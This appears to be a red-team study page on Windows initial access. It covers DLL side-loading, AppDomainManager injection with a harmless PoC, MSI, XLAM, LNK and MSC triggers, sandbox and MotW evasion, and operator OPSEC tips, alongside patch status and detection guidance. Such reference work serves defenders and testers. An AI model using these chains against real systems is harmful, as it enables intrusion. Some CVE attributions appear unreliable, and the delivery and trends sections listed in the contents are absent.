---
title: Initial Access
tags:
  - redteam
  - initial-access
  - phishing
---

# Initial Access — Master Reference

!!! abstract "About this page"
    Built on the Initial Access chapter of CRTO (Certified Red Team Operator) study material, then expanded with **per-version Windows 10 / 11 patch status (22H2 · 23H2 · 24H2)**, **realistic viability**, and the latest **evasion trends, OPSEC, and Blue Team / DFIR detection strategy**.
    The emphasis is on **mechanics, patch constraints, and detection/defence** rather than weaponization.

!!! note "Structure (four parts)"
    - **Part 1** — Phishing taxonomy & host-based payloads (DLL Side-Loading, .NET AppDomainManager)
    - **Part 2** — Installer and Office payloads (MSI, Excel Add-In, code-signing policy changes, GadgetToJScript droppers)
    - **Part 3** — Evolution of triggers and anti-sandbox (Batch tricks, LNK vulnerabilities and patches, GrimResource/MSC)
    - **Part 4** — Containers (MotW bypass matrix) & Delivery (HTML/SVG Smuggling, site cloning) + current trends

## Contents

- [1. Overview & phishing payload taxonomy](#overview)
- [2. Payloads — DLL Side-Loading / AppDomainManager](#payloads)
- [2.3–2.6 Installer · Office · code signing · droppers (Part 2)](#part2)
- [3. Triggers — Batch / LNK / GrimResource (Part 3)](#triggers)
- [4. Containers — MotW bypass matrix (Part 4)](#containers)
- [5. Delivery — HTML/SVG Smuggling · site cloning](#delivery)
- [6. Appendix — 2025~2026 current initial-access trends](#trends)

---

<a id="overview"></a>

# Chapter 05. Initial Access (Part 1)

## 1. Overview & phishing payload taxonomy

### 1.1 A modern definition of Initial Access

Initial Access (MITRE ATT&CK: TA0001) is the tactic of establishing the first foothold inside a target network. Attackers do sometimes exploit externally exposed servers (VPNs, web servers) or carry out supply-chain compromises, but the most common and effective route is still **social engineering via spear phishing**.

In the past it was enough to email a `report.exe` or a macro-laden `.doc`. Against a modern layered defence (email sandboxes, MotW, EDR, ASR rules) those are blocked instantly. Today's operator therefore has to combine several techniques into a multi-stage infection chain that disrupts automated analysis by security products and slows down reverse engineering by the DFIR analyst.

### 1.2 The five components of a phishing package

The payload taxonomy formalised by security researcher Mariusz Banach gives the most standard framework for designing an initial-access package:

```
DELIVERY( CONTAINER( TRIGGER + PAYLOAD + DECOY ) )
```

| Component | Role | Traditional (past) | Modern red-team trend (present) |
| --- | --- | --- | --- |
| **1. Delivery** | The means of getting the package past perimeter security (firewall, web proxy, email gateway) to the victim | Direct email attachment, plain HTTP download link | **HTML Smuggling, SVG Smuggling**, abuse of legitimate cloud storage (OneDrive, SharePoint), messenger (Teams) phishing |
| **2. Container** | A compression/disk format that bundles the files (trigger, payload, decoy), eases delivery, and **blocks MotW (Mark-of-the-Web) propagation** or adds encryption | `.zip`, `.rar` | `.iso`, `.img`, `.vhd/.vhdx`, `.wim`, `.7z`, WebDAV shares |
| **3. Trigger** | The file the victim directly interacts with (double-click) after opening the container, kicking off payload execution | `.exe`, Word/Excel macros (`.docm`, `.xlsm`) | **`.lnk` (shortcut)**, `.bat/.cmd`, `.msc`, legitimately signed executables (LOLBin / side-loading hosts) |
| **4. Payload** | The malicious code that actually runs on the victim (or a dropper/loader that fetches the final payload) | A single malicious `.exe`, a PowerShell one-liner | **Malicious `.dll` (for side-loading)**, `.xlam`, encrypted shellcode files (`.bin`, `.dat`), .NET assemblies |
| **5. Decoy** | A benign file shown right after the trigger fires, so the victim believes they opened a normal document | None (nothing happens, or a fake error window) | A legitimate `.pdf`, `.xlsx`, `.docx` that fits the pretext perfectly (must keep the same format as the trigger's icon) |

### 1.3 A real attack chain (Case study: Lumma Stealer campaign)

A representative chain showing how real threat groups combine the components to evade security products:

```
[Victim: downloads a file disguised as a PDF from a website]
       │
       ▼
┌───────────────────┐
│  1. Trigger       │  A Windows shortcut (.LNK) disguised with a PDF icon runs
└─────────┬─────────┘
          │ (invokes)
          ▼
┌───────────────────┐
│  2. LOLBin (1st)  │  wmic.exe or mshta.exe connects to a remote server (80.76.51[.]231)
└─────────┬─────────┘
          │ (download and run)
          ▼
┌───────────────────┐
│  3. Dropper (2nd) │  Obfuscated JavaScript (.js) -> calls an obfuscated PowerShell script
└─────────┬─────────┘
          │ (unpack and run hidden)
          ▼
┌───────────────────┐
│  4. Final Payload │  Lumma Stealer (Kompass-4.1.2.exe) runs
└─────────┬─────────┘
          │ (obtains C2 address - Dead Drop Resolver technique)
          ▼
┌───────────────────┐
│  5. C2 comms      │  Parses an HTML tag ("actual_persona_name") on a Steam community
└───────────────────┘  profile page, decrypts the real C2 domain, then communicates
```

!!! tip "Update note — per-version Windows validity of this chain"
    - **`WMIC`:** On **Windows 11 (22H2 and later) and upcoming Windows Server**, `wmic.exe` has been removed from the default install (deprecated / removed on demand). Putting `wmic` in a trigger chain will therefore fail against a current Windows 11 target.
    - **`mshta.exe` and `JavaScript`:** These are the top target of default detection rules in modern EDR (e.g. Microsoft Defender for Endpoint) and of ASR (Attack Surface Reduction) rules. Modern operators therefore favour **DLL side-loading** (below) over script engines.

---

<a id="payloads"></a>

## 2. Payloads in detail (and brought up to date)

### 2.1 DLL Side-Loading (DLL side-loading & abuse of WinSxS)

#### Core idea (DLL Hijacking vs. DLL Side-Loading)

When a Windows application (`.exe`) runs and the absolute path to a required dynamic-link library (`.dll`) is not hard-coded, Windows searches folders in a fixed order (the Standard DLL Search Order):

1. **The directory the application (`.exe`) is in (most important ⭐)**
2. The system directory (`C:\Windows\System32`)
3. The 16-bit system directory (`C:\Windows\System`)
4. The Windows directory (`C:\Windows`)
5. The current working directory
6. Directories listed in the `PATH` environment variable

- **DLL Hijacking:** When an already-installed program looks for a DLL that doesn't exist (`NAME NOT FOUND`), the attacker plants a malicious DLL in a path the standard user can write to (e.g. a sub-folder on `PATH`). Mostly used for privilege escalation and persistence.
- **DLL Side-Loading:** **Optimised for initial access.** A legitimately signed `.exe` (from Microsoft or another trusted vendor) is bundled in the same folder (inside the container) with a malicious `.dll` named exactly like the one that `.exe` loads. By search-order rule 1 (the application's own directory), the signed `.exe` loads the malicious `.dll` sitting beside it the moment it runs.

#### Why target `C:\Windows\WinSxS`?

Executables in the default system folders (`System32` etc.) have been hardened over successive patches so they only search safe paths (their own folder, the GAC, and so on). But `C:\Windows\WinSxS` (the Windows Component Store) is a huge warehouse that keeps **pre-patch, older binary versions** for application compatibility (side-by-side assemblies) and update rollback. In other words, a vulnerable, pre-patch version of a genuinely Microsoft-signed binary that is fixed in the main OS can still be sitting inside `WinSxS`.

#### [Analysis guide] Identifying a vulnerable binary in WinSxS

**Step 1. Observe the behaviour of the current binary (`ngentask.exe`)** — Run the current `ngentask.exe` from its default path and watch it with Sysinternals Process Monitor (ProcMon).

- ProcMon filters:
    - `Process Name` `is` `ngentask.exe`
    - `Path` `ends with` `.dll`
    - `Result` `is` `NAME NOT FOUND`

```
C:\Users\Analyst> C:\Windows\Microsoft.NET\Framework64\v4.0.30319\ngentask.exe
```

> **Result:** You see DLLs it can't find, but it only searches inside `C:\Windows\Microsoft.NET\Framework64\...` and the GAC (Global Assembly Cache) — it never looks in external folders, so hijacking is hard.

**Step 2. Find an older `ngentask.exe` in `WinSxS`** — Use PowerShell to search for older versions kept inside the `WinSxS` directory.

```powershell
PS C:\> Get-ChildItem -Path C:\Windows\WinSxS -Recurse -Filter ngentask.exe | Select-Object -ExpandProperty FullName

C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_..._4.0.15805.0_...\ngentask.exe
C:\Windows\WinSxS\amd64_netfx4-ngentask_exe_..._4.0.15805.285_...\ngentask.exe
...
```

**Step 3. Run the older version and check its search order** — Run the older binary and watch ProcMon again. The older version follows the standard search order to find `mscorsvc.dll` and tries to load it from the current working directory (`NAME NOT FOUND`). That location is the spot vulnerable to side-loading.

#### [Advanced] Higher-reliability side-loading concepts for real operations

Beyond simply firing from `DllMain`, two concepts matter for reliability and success rate in a real engagement:

1. **DLL Proxying / Forwarding:** When the legitimate program loads the DLL and immediately calls a specific export, a replacement DLL that lacks that export causes the program to crash — the victim notices, and a crash dump lands in the EDR telemetry. A proxy DLL (e.g. `SharpDllProxy`) forwards the program's legitimate function calls to the real system DLL (`C:\Windows\System32\...`) so the program keeps running normally while the malicious code runs on a background thread.
2. **Third-party signed binaries:** When a Microsoft default binary (e.g. `ngentask.exe`) runs from an unusual path (e.g. `Downloads`), modern EDR gets suspicious. Operators therefore increasingly use older signed executables from NVIDIA, Adobe, Cisco, VLC, etc. as the host — third-party programs legitimately install in many locations, so they evade path-based heuristics far better. (Reference database: **HijackLibs.net**)

### 2.2 .NET AppDomainManager Injection

#### Core idea

Independent of DLL search order, **every application written in the .NET Framework** has an official feature to specify the `AppDomainManager` it will use at startup. The technique: create a .NET assembly (DLL) that inherits from `System.AppDomainManager`, then use an environment variable or a `.config` file to tell a legitimate .NET executable "load this DLL as your manager when you run."

#### [Concept example] Structure of a custom AppDomainManager

**Step 1. .NET Framework class library (PoC only — just shows a MessageBox)**

```csharp
using System;
using System.Windows.Forms;

namespace AppDomainHijack
{
    // A public class that inherits from AppDomainManager
    public sealed class DomainManager : AppDomainManager
    {
        // Override the method called automatically when the domain initialises
        public override void InitializeNewDomain(AppDomainSetup appDomainInfo)
        {
            // PoC — in a real engagement a loader would go here; this document is for understanding the mechanism
            MessageBox.Show("Hello World", "Success");
        }
    }
}
```

**Step 2. Place a legitimate .NET binary and the DLL in the same folder** — Pick one of the signed .NET executables shipped with Windows (e.g. `ngentask.exe`, `dfsvc.exe`, `UEVAppMonitor.exe`) and put the compiled DLL beside it. The **assembly name specified in the config/environment variable must match the actual DLL filename** for it to load.

**Step 3. Choose a trigger (two options)**

- **Option A — environment variables** (mainly used from a batch file or LNK trigger):

```powershell
PS C:\> $env:APPDOMAIN_MANAGER_ASM  = 'AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null'
PS C:\> $env:APPDOMAIN_MANAGER_TYPE = 'AppDomainHijack.DomainManager'
PS C:\> .\ngentask.exe
```

- **Option B — application config file (`.config`)** (cleanest for container packaging ⭐): Put a text file named after the executable with `.config` appended (e.g. `ngentask.exe.config`) in the same folder, and running just the `.exe` works without any environment variables.

```xml
<configuration>
  <runtime>
    <appDomainManagerAssembly value="AppDomainHijack, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null" />
    <appDomainManagerType value="AppDomainHijack.DomainManager" />
  </runtime>
</configuration>
```

### [Compatibility & patch matrix] Part 1 assessment

| Technique | Target OS / framework compatibility | Impact of recent patches (Win 10 / Win 11 23H2~24H2) | Real-world viability & OPSEC tips |
| --- | --- | --- | --- |
| WinSxS-based DLL Side-Loading | **All Windows versions** (Win 10 / Win 11 / Server) | The `WinSxS` structure is retained at the OS level. However, modern EDR detects **a default system binary running from an unusual path** behaviourally. | **[High — but change the host]** Using a **third-party legitimately signed executable** as the host instead of a Microsoft default gives a high success rate even on current Win 11 + EDR. |
| AppDomainManager Injection | **.NET Framework (v2.0 ~ v4.8.1)** only (built into every Win 10/11) | Does **not** work on apps built on **.NET Core 3.1+ or .NET 5~9** (use `DOTNET_STARTUP_HOOKS` instead). **ETW** records the .NET assembly-load event to EDR. | **[Medium-high — still strong]** The `.config` method leaves no script on disk, so it resists static detection. But the DLL's code must avoid **AMSI/ETW** via obfuscation and dynamic API calls (D/Invoke). |

### [Blue Team / DFIR] Detection and defence

1. **Detect `OriginalFilename` mismatch in the PE header (Sysmon Event ID 1 & 7):** Even if an attacker renames `ngentask.exe` to `PDFViewer.exe`, the PE header's `OriginalFilename` still reads `ngentask.exe`. EDR alerts when the current filename differs from the header name, or when a file that should live in `System32`/`Framework64` runs from `Downloads` or a mounted virtual drive (`D:\`, `E:\`).
2. **Watch for abnormal `.config` creation and unsigned DLL loads:** Monitor `*.exe.config` creation via Sysmon Event ID 11 (FileCreate), and track events where a signed Microsoft binary loads an unsigned DLL.

---

<a id="part2"></a>

# Chapter 05. Initial Access (Part 2)

### 2.3 Windows Installer (.MSI) packages

#### Core idea

Windows Installer (`.msi`) stores the files needed for installation and the per-step actions in an internal relational database (a set of tables). In the taxonomy it can therefore act as **both a Container and a Trigger/Payload**.

- **Packaging structure:** Visual Studio's 'Setup Project' lets you place target files into `Program Files`, the desktop, etc., and manipulate file properties to rename on drop (`TargetName`) or hide (`Hidden: True`).
- **Abusing Custom Actions:** The main reason MSI is risky is **Custom Actions** — the ability to hook arbitrary executables (`.exe`), DLLs, or scripts (`.vbs`, `.js`) into the install/commit/rollback/uninstall steps.
- **Disguise:** Attackers enable the `Run64Bit` property, pass legitimate-looking arguments like `/install /quiet`, and fill in a legitimate `Manufacturer` and `ProductName` so it looks like normal software in Control Panel and in its install path.

#### Recent patches and constraints

1. **Parent-child process behaviour detection (EDR):** In the past `msiexec.exe` executed the payload in the background and evaded ordinary AV. Today, modern EDR (MDE, CrowdStrike, etc.) on Win 10/11 classifies `msiexec.exe` spawning an unsigned binary or a script engine (`wscript.exe`, `powershell.exe`, `rundll32.exe`) as high risk and blocks it immediately.
2. **UAC / admin rights:** Configuring the MSI to drop into `C:\Program Files` triggers a UAC elevation prompt for a standard user. If the victim lacks local admin, the install fails — so real threat groups modify the MSI tables for a per-user install (`%LocalAppData%` paths) that needs no elevation.

### 2.4 Excel Add-In (.XLAM) and Trusted Locations

#### Core idea

Ordinary macro documents (`.docm`, `.xlsm`) are blocked from running macros by the MotW tag applied on download and by Office's Protected View. This technique bypasses that by combining an Excel add-in (`.xlam`) with Office's Trusted Locations.

- **The Trusted Locations gap:** For files opened from certain folders registered in the Trust Center, Office skips security checks and enables macros immediately:
    - `%ProgramFiles%\Microsoft Office\root\Office16\XLSTART\` (not writable by a standard user)
    - **`%APPDATA%\Microsoft\Excel\XLSTART\` (writable by a standard user ⭐)**
    - `%APPDATA%\Microsoft\Templates\` (writable by a standard user)
- **Auto-run mechanism:** The `XLSTART` folder auto-loads every workbook/add-in (`.xlam`) in it each time Excel starts, with no user consent. A `.xlam` containing an `Auto_Open()` subroutine copied there runs its macro on the next launch — so it doubles as a **persistence** technique.

#### Recent patches and constraints

1. **Blocked by ASR (Attack Surface Reduction) rules:** Even if you strip MotW via a container and auto-run through `XLSTART`, Defender ASR (if enabled on Win 10/11 Enterprise) blocks the post-macro steps. (Key rules: "Block all Office applications from creating child processes", "Block Office applications from creating executable content", "Block Win32 API calls from Office macros".)
2. **Tighter control of Excel 4.0 (XLM) and XLL:** Besides VBA-based `.xlam`, C/C++ DLL add-ins (`.xll`) were heavily abused — but recent M365 updates greatly strengthened blocking of internet-sourced add-ins and AMSI's runtime memory scanning of macros.

### 2.5 Code signing and the shift in the SmartScreen trust model

#### Core idea

Code signing adds a digital signature to an executable or installer to assure the publisher's identity and file integrity. **Microsoft Defender SmartScreen** treats signing as a key trust signal; signed files trigger far fewer (or no) warnings and fare better in static AV/EDR verdicts.

- **Standard vs. EV certificates (as the course describes):**
    - **Standard:** Signs the file, but SmartScreen warnings still appear until the certificate has built up global download reputation.
    - **EV (Extended Validation):** Issued after strict vetting; historically earned instant SmartScreen trust on first use, fully removing the 'Unknown Publisher' warning.
- **How attackers obtain certificates:** Signing under their own company name gets them identified and revoked immediately, so they set up shell companies or steal other companies' certificates leaked in public repos, buckets, or forums.

#### [Essential update] The upheaval in code-signing and SmartScreen policy (2023~2026)

This is where the course and today's environment diverge most.

1. **Hardware token (HSM) storage mandated (CA/Browser Forum rule change):** Since June 2023, **even Standard code-signing certificates are no longer issued as `.pfx`/`.p12` files.** All private keys must live only in a physical hardware token (FIPS 140-2 Level 2 or higher) or a cloud HSM (Azure Key Vault, AWS KMS). This sharply reduced "steal a `.pfx` and sign locally" attacks, shifting the threat toward hijacking cloud CI/CD signing permissions.
2. **EV's 'instant SmartScreen bypass' privilege removed:** After a surge of EV abuse via shell companies, Microsoft overhauled the SmartScreen scoring algorithm. **On current Win 10/11, an EV signature no longer grants instant reputation**, and warnings persist — regardless of EV status — until reputation is established from file/signer history and distribution volume.

### 2.6 Droppers and .NET deserialization (GadgetToJScript)

#### Core idea

A dropper is an intermediate program that doesn't expose the final payload in the container, but hides it in its own embedded resource and either writes it to disk or downloads it at runtime.

```
[How a GadgetToJScript-based dropper works]

1. Build .NET DLL (C#)        2. Serialize & convert to script     3. Runs on victim PC
┌──────────────────────┐    ┌──────────────────────────┐    ┌────────────────────────┐
│ MyDropper.dll        │    │ GadgetToJScript tool     │    │ Double-click dropper.js│
│  └─ Embedded Resource│ ──>│  └─ Build .NET gadget    │ ──>│  └─ wscript.exe runs   │
│     (http_x64.exe)   │    │  └─ Base64 encode (to JS)│    │  └─ Deserialize in mem │
└──────────────────────┘    └──────────────────────────┘    └───────────┬────────────┘
                                                                        │
                                                                        ▼
                                                            ┌────────────────────────┐
                                                            │ C# constructor auto-runs│
                                                            │  └─ Drops/runs EXE under│
                                                            │     C:\ProgramData\...  │
                                                            └────────────────────────┘
```

- **Reflection and resource extraction:** The executable is embedded as a resource in a C# library, and the class constructor reads it into memory via `Assembly.GetExecutingAssembly().GetManifestResourceStream()`.
- **Choosing a drop location (OPSEC):** Dropping into `%TEMP%` or the home directory gets detected immediately. So droppers create a sub-folder under **`C:\ProgramData\*`** — a standard path that even a standard user can write to and create folders in.
- **Turning it into a script with GadgetToJScript:** A compiled .NET DLL can't run by itself, so `GadgetToJScript` abuses **.NET deserialization** to convert the assembly into `.js`/`.vbs`/VBA/HTA script. When the victim runs the `.js` (`wscript.exe`), the object deserializes in memory and the dropper code in the constructor executes.

#### Recent patches and constraints

1. **AMSI fully integrated:** When `wscript.exe`/`cscript.exe` runs a `.js`/`.vbs`, the engine hands the plaintext to AV via **AMSI** right before execution. The serialized gadget patterns `GadgetToJScript` produces now have signatures in every commercial AV/EDR, so without obfuscation/AMSI bypass they're blocked on run.
2. **Retirement of .NET `BinaryFormatter`:** `BinaryFormatter` deserialization is disabled by default in recent .NET due to its risk, and even on 4.8.1 the EDR's ETW telemetry watches in-memory `Assembly.Load` in real time.
3. **Win 11 restrictions on JScript/VBScript:** To curb legacy-script-engine infections, Microsoft is restricting WSH and VBScript defaults or removing them as optional features (FOD).

### [Compatibility & patch matrix] Part 2 assessment

| Category / technique | Target OS / environment | Impact of recent patches | Blue Team detection focus |
| --- | --- | --- | --- |
| Windows Installer (`.msi`) | **All Windows versions** (built-in `msiexec.exe`) | UAC prompt when targeting `Program Files`. EDR behavioural detection when `msiexec.exe` spawns an abnormal child process. | **Sysmon ID 1:** parent `msiexec.exe` with a child that is unsigned or runs from `C:\ProgramData`. Static analysis of the MSI CustomAction table (Orca). |
| Excel Add-In (`.xlam`) | **MS Office** (2016/2019/M365) | `XLSTART` is still a Trusted Location. But ASR, when enabled, blocks macro-driven process creation and Win32 API calls. | **Sysmon ID 11:** real-time monitoring of new files in `%APPDATA%\Microsoft\Excel\XLSTART\` and `AddIns` (top-priority rule). |
| Code Signing (EV cert) | **All Windows versions** (SmartScreen) | **HSM storage mandated**, reducing cert leaks. **EV instant-bypass privilege removed** (merged into reputation). | Even for signed binaries, cross-check certificate issue date, unfamiliar publisher name, and first-seen prevalence in the org. |
| GadgetToJScript (`.js`/`.vbs` dropper) | **.NET Framework 4.8.x** (built into Win 10/11) | **AMSI and .NET ETW** detect serialized gadget patterns with high probability. Drop-`.exe`-then-`Process.Start` is weak against EDR. | Detect `wscript.exe`/`cscript.exe` loading .NET CLR DLLs (`clr.dll`, `mscoree.dll`) in memory (Sysmon ID 7). Watch for new executables under `C:\ProgramData`. |

---

<a id="triggers"></a>

# Chapter 3. Triggers (initial execution & anti-sandbox)

A trigger is the file the victim first interacts with (usually a double-click) after mounting/extracting a container. Its goals are to disguise itself as a familiar file to avoid suspicion, and to run the payload and a benign decoy at the same time in the background.

### 3.1 Batch scripts (`.bat`, `.cmd`) and env-variable anti-sandbox

#### Core idea

A text script format that runs commands sequentially through `cmd.exe` (`.bat`, `.cmd`, `.btm`).

- **Hiding the window:** `@echo off` at the top plus `> nul 2>&1` on commands hides stdout and stderr.
- **Env-variable anti-sandbox trick:** To evade automated AV emulators/sandboxes, the batch checks whether it was launched by a real double-click or by an analysis CLI, by comparing environment variables.

```
[How environment variables differ by launch method]

1. User double-clicks in Explorer:
   • %cmdcmdline% : C:\Windows\system32\cmd.exe /c ""C:\Users\Victim\Desktop\test.bat" "
   • %~f0         : C:\Users\Victim\Desktop\test.bat
   ▶ %cmdcmdline% contains %~f0 (the script path) -> proceed as normal

2. A sandbox/analyst runs it from an already-open CMD:
   • %cmdcmdline% : "C:\Windows\System32\cmd.exe"
   • %~f0         : C:\Users\Victim\Desktop\test.bat
   ▶ %cmdcmdline% does NOT contain the script path -> treat as analysis, exit immediately
```

In short, it pipes `%cmdcmdline%` to `find /i "%~f0"` to search for the current batch path, and if no match (`||`) it `exit`s immediately, defeating programmatic automated analysis.

#### Recent patches and constraints

1. **Can't change the default icon (social-engineering limit):** `.bat`/`.cmd` can't carry their own icon resource and always show the default batch icon. Used alone they're easily spotted, so they're mostly a 2nd-stage script invoked hidden by a `.lnk` or another trigger.
2. **EDR command-line auditing and AMSI:** Every child process spawned via `cmd.exe /c` has its full command line recorded to the security log (Event ID 4688, Sysmon ID 1). Modern Defender/EDR also detect obfuscation patterns (e.g. substring tricks like `%var:~0,1%`) statically and dynamically.

### 3.2 Windows Shell Link (`.lnk` shortcut files)

#### Core idea

The `.lnk` (Shell Link) binary format is the most widely used deceptive trigger in initial access.

- **Extension hiding via NeverShowExt:** Even with 'Show file name extensions' enabled, the `.lnk` extension is **never displayed**, thanks to the registry `NeverShowExt` attribute. Naming a file `report.pdf.lnk` makes it appear as exactly `report.pdf`.
- **Icon disguise and compound commands:** Using the `WScript.Shell` COM object, the target (`TargetPath`) can be set to `%COMSPEC%` (`cmd.exe`) while the icon (`IconLocation`) is overridden with an Edge (`msedge.exe, 13` — the built-in PDF icon) or Excel (`EXCEL.EXE, 0`) icon.
- **Driving hidden files:** If a payload inside the container (e.g. `macros.xlam`) has the hidden attribute, the `.lnk`'s `Arguments` can `xcopy /H` it into `%APPDATA%\Microsoft\Excel\XLSTART\`, clear the hidden attribute with `attrib -H`, and open the decoy (`sales.xlsx`) — all in a single click.

#### Recent patches and constraints

1. **Stronger SmartScreen/MotW checks (CVE-2022-44698, CVE-2023-36025, CVE-2024-21412 patches):** There used to be bugs where a `.lnk` with MotW bypassed SmartScreen, but concentrated patching means **current Win 10/11 builds strictly check the target path and arguments of an externally sourced `.lnk`**.
2. **`explorer.exe` → `cmd.exe`/`powershell.exe` process-tree detection:** When a `.lnk` click launches `cmd`/`powershell`, the parent is recorded as `explorer.exe` and the command line shows `&&`, `start`, `xcopy`, etc. That is a basic block/alert condition in modern EDR and ASR.
3. **Current trend (LNK + LOLBins/side-loading):** Instead of putting the heavily detected `cmd`/`powershell` directly in `TargetPath`, operators now point it at a legitimately signed executable (a DLL side-loading host) hidden alongside in the container, skipping the script-interpreter call entirely.

### 3.3 Microsoft Saved Console (`.msc` — GrimResource)

#### Core idea

Discovered and named 'GrimResource' by Elastic Security Labs in 2024, this abuses the `.msc` (Microsoft Saved Console) format — the settings file for the Windows management console (`mmc.exe`).

```
[GrimResource (.msc) execution flow]

[Victim: double-clicks a malicious .msc file]
       │
       ▼
┌────────────────────────────────────────────────────────┐
│ 1. mmc.exe runs (auto-elevating)                        │
│    └─ If a local admin, gains High Integrity            │
└───────────────────────────┬────────────────────────────┘
                            │ (parses the .msc internal XML)
                            ▼
┌────────────────────────────────────────────────────────┐
│ 2. Triggers an XSS flaw in apds.dll (StringTable abuse) │
│    └─ Loads a URL-encoded XSL stylesheet (xsl.loadXML)  │
└───────────────────────────┬────────────────────────────┘
                            │ (invokes the XSLT script engine)
                            ▼
┌────────────────────────────────────────────────────────┐
│ 3. Runs embedded VBScript / JScript                     │
│    └─ WScript.Shell or a DotNetToJScript payload        │
└────────────────────────────────────────────────────────┘
```

- **XSS and XSLT execution via apds.dll:** A `.msc` is essentially XML text. By manipulating its `StringTable` section the technique triggers an XSS flaw in the Windows help library `apds.dll`, loading a URL-encoded XSL stylesheet (VBScript/JScript inside an `ms:script` tag) as `xsl.loadXML(unescape(...))` to run arbitrary code.
- **Auto-elevation benefit:** `mmc.exe` is an auto-elevating binary per its manifest, so if the victim is in the local admin group, the payload runs at High Integrity (admin) right at initial access.

#### [Essential update] GrimResource patch status and constraints

1. **Officially patched by Microsoft (doesn't work on current builds):** After disclosure, Microsoft patched the root cause in regular updates (e.g. late-2024 cumulative updates) so `mmc.exe`/`apds.dll` won't process abnormal external resources or inline scripts. **On patched Win 10 (22H2) and Win 11 (23H2/24H2) it no longer works.**
2. **Thoroughly detected by EDR:** An office user running a `.msc` is itself unusual, and `mmc.exe` loading `apds.dll` then spawning a child process (`cmd.exe` etc.) or loading the .NET CLR is blocked immediately by major EDR.

### [Compatibility & patch matrix] Part 3 assessment

| Trigger format | Target OS | Impact of recent patches | Blue Team / DFIR detection focus |
| --- | --- | --- | --- |
| Batch (`.bat`, `.cmd`) | **All Windows versions** | The `%cmdcmdline%` trick can still evade older sandboxes. But modern EDR sandboxes simulate the Explorer click event and defeat it. | **Event ID 4688 / Sysmon 1:** `cmd.exe` with `find /i` + env-variable combos. Block batch files running from ISO/archive mount paths (`D:\`, `E:\`, `%TEMP%`). |
| Shell Link (`.lnk`) | **All Windows versions** (Explorer native) | `NeverShowExt` extension hiding is identical on all versions. **CVE-2023-36025 / CVE-2024-21412** patched many SmartScreen-bypass bugs. | Alert when a `.lnk`'s `Target` points at a system interpreter (`cmd`, `powershell`, `mshta`, `rundll32`). Extract timestamps and the attacker's `MachineID`/`MAC` artifacts from inside the `.lnk` (DFIR). |
| MS Saved Console (`.msc` — GrimResource) | Unpatched Win 10/11 only | **Patched on current cumulative updates — no longer works.** Directly affected by the gradual VBScript deprecation. | **Sysmon ID 7 (ImageLoad):** `mmc.exe` abnormally loading `apds.dll`, `mshtml.dll`, `vbscript.dll`, `jscript.dll` in sequence. Static detection of `apds://` or `loadXML` strings in the `.msc` XML (YARA). |

### [Blue Team / DFIR deep dive] LNK forensic artifacts (OPSEC)

When you create a `.lnk` with PowerShell (`WScript.Shell`), Windows writes **the creating computer's NetBIOS hostname, volume serial, and even MAC address** into the `.lnk` binary structure (the `DistributedLinkTrackerBlock` in the `ExtraData` block).

- **Defender (DFIR) view:** Analysing a recovered `.lnk` with `LECmd` (Eric Zimmerman's tool) can pin down the attacker's build-environment computer name and timestamps.
- **Operator (OPSEC) view:** When creating a `.lnk` for a target, strip the metadata (`TrackerDataBlock`) with a tool or build it in a disposable clean VM, to avoid leaking internal infrastructure details.

---

<a id="containers"></a>

# Chapter 4. Containers (and MotW bypass)

### 4.1 Mark of the Web (MotW) — structure and role

MotW is a security identifier that Windows (or a browser/mail client) automatically attaches to files downloaded from the internet or an untrusted zone.

- **NTFS Alternate Data Stream (ADS):** NTFS can store hidden extra streams alongside a file's main data (`:$DATA`). On download, the browser creates a `Zone.Identifier` ADS recording the origin.

```powershell
PS C:\Users\Analyst\Downloads> Get-Content -Stream Zone.Identifier .\test.pdf

[ZoneTransfer]
ZoneId=3
ReferrerUrl=https://.../test.pdf
HostUrl=https://.../test.pdf
```

- **`ZoneId` meanings:** `0` Local Machine · `1` Local Intranet · `2` Trusted Sites · **`3` Internet (applied to external downloads) ⭐** · `4` Restricted Sites

With a `ZoneId=3` tag, the file Properties window shows a "this file came from another computer and may be blocked" warning; Windows forces **SmartScreen** on executables and applies Protected View (blocking macros) to Office documents.

### 4.2 Purpose and packaging of containers

1. **Bundling and hiding multiple files:** Dependencies like the trigger (`.lnk`), payload (`.dll`/`.xlam`), and decoy (`.pdf`/`.xlsx`) are bundled into one package. A tool like `PackMyPayload` with its `-H` option sets the **hidden attribute** on inner files so the victim sees only the trigger when they open the container.
2. **Blocking MotW propagation:** The container itself (e.g. `test.iso`) carries MotW (`ZoneId=3`) as a download, but the traditional core trick was to launder (strip) MotW by exploiting the gap where older archive/mount tools **don't copy the `Zone.Identifier` stream to the individual inner files** on extraction.

### 4.3 [Essential update] Per-format MotW propagation patch status (Win 10 / 11)

The course says mounting a `.iso`/`.img` removes MotW from inner files — but **this is the area that changed most dramatically** due to Microsoft patches.

| Container format | Native Windows support | Past behaviour (per course) | Current OS behaviour (Win 10 22H2 / Win 11 22H2~24H2) | Current viability |
| --- | --- | --- | --- | --- |
| `.iso`, `.img` (optical disc image) | Yes (double-click mounts a virtual DVD) | ISO internals are ISO-9660/UDF, not NTFS, so no ADS → inner-file MotW disappears. | **[Patched — CVE-2022-41091 etc.]** If a mounted ISO/IMG original has MotW, the kernel driver **auto-inherits MotW (`ZoneId=3`) onto all files inside the mounted virtual drive.** | **[MotW bypass gone]** Still usable to bundle and hide files, but no longer works for MotW laundering. |
| `.vhd`, `.vhdx` (virtual hard disk) | Yes (double-click mounts a virtual disk) | Recognised as a separate local disk, so MotW didn't propagate — a popular bypass. | **[Patched]** Like ISO, a VHDMP driver update propagates the original VHD's MotW onto files inside the mounted volume. | **[Low]** VHD mounts in a normal office environment raise immediate EDR alerts. |
| `.zip` (standard archive) | Yes (built into Explorer) | Explorer extraction propagated MotW, but 7-Zip/WinRAR extraction dropped it. | **[Hardened]** Explorer still propagates. Current WinRAR and 7-Zip (with the option on) were patched to propagate MotW on extraction too. | **[Medium]** Less for MotW bypass, more as a **password-protected ZIP** to evade static scanning at the email gateway — still widely used. |
| `.7z`, `.rar`, `.tar`, `.gz` | **Yes (built in since Win 11 23H2 ⭐)** | Not natively supported before — couldn't open without a separate archiver. | **[Big Win 11 change]** Since Win 11 (23H2+), open-source `libarchive` is built into Explorer, so these extract natively without extra software. | **[High — new research target]** Early `libarchive` integration had bugs that dropped MotW on certain formats (CVE-2024-21410 etc.); an ongoing patch target. |
